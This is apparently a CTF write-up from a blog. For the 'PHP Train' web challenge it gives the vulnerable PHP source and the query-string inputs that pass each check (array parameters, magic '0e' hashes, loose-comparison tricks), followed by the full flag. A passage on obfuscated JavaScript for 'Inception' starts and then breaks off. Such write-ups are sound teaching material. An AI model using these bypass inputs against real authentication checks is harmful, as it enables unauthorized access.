<h2 id="web">Web <a href="#web" class="anchor">#</a></h2>
<h3 id="php-train">PHP Train <a href="#php-train" class="anchor">#</a></h3>
<p>We were given a website with the below source code</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#555">&lt;?</span>php
</span></span><span style="display:flex;"><span>    show_source(<span style="color:#c30">&#34;index.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">include</span> <span style="color:#c30">&#39;constants.php&#39;</span>;
</span></span><span style="display:flex;"><span>    error_reporting(<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span>(isset(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param1&#34;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(<span style="color:#555">!</span>strcmp(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param1&#34;</span>], CONSTANT1)) {
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">echo</span> FLAG1;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span>(isset(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param2&#34;</span>]) <span style="color:#555">&amp;&amp;</span> isset(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param3&#34;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#033">$str2</span> <span style="color:#555">=</span> <span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param2&#34;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#033">$str3</span> <span style="color:#555">=</span> <span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param3&#34;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>((<span style="color:#033">$str2</span> <span style="color:#555">!==</span> <span style="color:#033">$str3</span>) <span style="color:#555">&amp;&amp;</span> (sha1(<span style="color:#033">$str2</span>) <span style="color:#555">===</span> sha1(<span style="color:#033">$str3</span>))) {
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">echo</span> FLAG2;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span>(isset(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param4&#34;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#033">$str4</span> <span style="color:#555">=</span> <span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param4&#34;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#033">$str4</span><span style="color:#555">=</span>trim(<span style="color:#033">$str4</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(<span style="color:#033">$str4</span> <span style="color:#555">==</span> <span style="color:#c30">&#39;1.2e3&#39;</span> <span style="color:#555">&amp;&amp;</span> <span style="color:#033">$str4</span> <span style="color:#555">!==</span> <span style="color:#c30">&#39;1.2e3&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">echo</span> FLAG3;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span>(isset(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param5&#34;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#033">$str5</span> <span style="color:#555">=</span> <span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param5&#34;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(<span style="color:#033">$str5</span> <span style="color:#555">==</span> <span style="color:#f60">89</span> <span style="color:#555">&amp;&amp;</span> <span style="color:#033">$str5</span> <span style="color:#555">!==</span> <span style="color:#c30">&#39;89&#39;</span> <span style="color:#555">&amp;&amp;</span> <span style="color:#033">$str5</span> <span style="color:#555">!==</span> <span style="color:#f60">89</span> <span style="color:#555">&amp;&amp;</span> strlen(trim(<span style="color:#033">$str5</span>)) <span style="color:#555">==</span> <span style="color:#f60">2</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">echo</span> FLAG4;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span>(isset(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param6&#34;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#033">$str6</span> <span style="color:#555">=</span> <span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param6&#34;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(hash(<span style="color:#c30">&#39;md4&#39;</span>, <span style="color:#033">$str6</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">echo</span> FLAG5;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span>(isset(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param7&#34;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#033">$str7</span> <span style="color:#555">=</span> <span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param7&#34;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#033">$var1</span> <span style="color:#555">=</span> <span style="color:#c30">&#39;helloworld&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#033">$var2</span> <span style="color:#555">=</span> preg_replace(<span style="color:#c30">&#34;/</span><span style="color:#a00">$var1</span><span style="color:#c30">/&#34;</span>, <span style="color:#c30">&#39;&#39;</span>, <span style="color:#033">$str7</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(<span style="color:#033">$var1</span> <span style="color:#555">===</span> <span style="color:#033">$var2</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">echo</span> FLAG6;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span>(isset(<span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param8&#34;</span>])) {
</span></span><span style="display:flex;"><span>        <span style="color:#033">$str8</span> <span style="color:#555">=</span> <span style="color:#033">$_GET</span>[<span style="color:#c30">&#34;param8&#34;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#033">$comp</span> <span style="color:#555">=</span> range(<span style="color:#f60">1</span>, <span style="color:#f60">25</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span>(in_array(<span style="color:#033">$str8</span>, <span style="color:#033">$comp</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span>(preg_match(<span style="color:#c30">&#34;/\.env/&#34;</span>, <span style="color:#033">$str8</span>)) {
</span></span><span style="display:flex;"><span>                <span style="color:#069;font-weight:bold">echo</span> FLAG7;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#099">?&gt;</span><span style="color:#a00;background-color:#faa">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>So we need to bypass all this check to retrieve the full flag.</p>
<h4 id="flag-1">Flag 1 <a href="#flag-1" class="anchor">#</a></h4>
<p>To bypass strcmp, we can simply pass <code>param1[]=a</code>. We got <code>p_ctf{ech0_</code>.</p>
<h4 id="flag-2">Flag 2 <a href="#flag-2" class="anchor">#</a></h4>
<p>To bypass sha1 collision, we can simply pass array to both params (<code>param2[]=a&amp;param3[]=b</code>). We got <code>1f_7h3_7r41n_</code>.</p>
<h4 id="flag-3">Flag 3 <a href="#flag-3" class="anchor">#</a></h4>
<p>We just need to pass <code>param4=1200</code> becaue <code>1.2e3</code> is equals to <code>1200</code>. We got <code>d035_n07_</code>.</p>
<h4 id="flag-4">Flag 4 <a href="#flag-4" class="anchor">#</a></h4>
<p>We just need to pass <code>param5=89%20</code> because the value checking is using loose comparison, so the whitespace will be discarded. We got <code>5t0p_1n_y0ur_</code>.</p>
<h4 id="flag-5">Flag 5 <a href="#flag-5" class="anchor">#</a></h4>
<p>We just need to pass magic hash as <code>param6=gH0nAdHk</code>, where the hash result prefix is <code>0e</code> because of the loose comparison. We got <code>5t4t10n_7h3n_</code>.</p>
<h4 id="flag-6">Flag 6 <a href="#flag-6" class="anchor">#</a></h4>
<p>We just need to pass <code>param7=hellohelloworldworld</code>, so that after the <code>preg_replace</code>, the <code>param7</code> value will be <code>helloworld</code>. We got <code>1t5_n07_</code>.</p>
<h4 id="flag-7">Flag 7 <a href="#flag-7" class="anchor">#</a></h4>
<p>We just need to pass <code>param8=1.env</code> because <code>in_array</code> use loose comparison, so as long as our first string start with <code>1</code>, <code>in_array</code> will return true. We got <code>y0ur_7r41n}</code>.</p>
<blockquote>
<p>Flag: p_ctf{ech0_1f_7h3_7r41n_d035_n07_5t0p_1n_y0ur_5t4t10n_7h3n_1t5_n07_y0ur_7r41n}</p>
</blockquote>
<h3 id="inception">Inception <a href="#inception" class="anchor">#</a></h3>
<p>We were given a website. Checking the source code, we got obfuscated javascript. Now, we just need to examine properly the obfuscated.
The first part is this code</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> _0xa965<span style="color:#555">=</span>[<span style="color:#c30">&#34;\x65\x6E\x74\x72\x69\x65\x73&#34;</span>,<span style="color:#c30">&#34;&#34;</span>,<span style="color:#c30">&#34;\x62&#34;</span>,<span style="color:#c30">&#34;\x61&#34;</span>,<span style="color:#c30">&#34;\x74\x6F&#34;</span>,<span style="color:#c30">&#34;\x6E\x61\x6D\x65&#34;</span>,<span style="color:#c30">&#34;\x61\x6C\x6C&#34;</span>,<span style="color:#c30">&#34;\x66\x69\x6C\x6C&#34;</span>,<span style="color:#c30">&#34;\x4D\x49\x4E\x5F\x56\x41\x4C\x55\x45&#34;</span>];(<span style="color:#069;font-weight:bold">function</span>(){<span style="color:#069;font-weight:bold">var</span> _0x31e3x1<span style="color:#555">=</span>()=&gt;{
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> _0x31e3x2<span style="color:#555">=</span>[][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]][([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]]((<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">+</span>[<span style="color:#555">!</span>[]]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">+</span>(<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]]))[(<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([]<span style="color:#555">+</span> [])[([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> 